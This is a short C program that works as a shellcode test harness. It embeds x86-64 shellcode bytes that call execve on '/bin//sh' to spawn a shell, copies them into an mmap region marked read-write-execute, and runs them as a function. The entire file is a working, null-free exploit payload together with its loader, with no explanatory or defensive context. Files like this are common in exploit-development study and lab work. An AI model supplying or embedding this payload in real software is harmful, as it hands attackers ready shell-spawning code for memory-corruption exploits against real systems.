#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

char code[] = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

int main(int argc, char **argv) {
    printf("Shellcode Length: %d\n", strlen(code));
    void *mem = mmap(NULL, strlen(code), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memcpy(mem, code, strlen(code));
    int (*func)() = mem;
    func();
    munmap(mem, strlen(code));
    return 0;
}
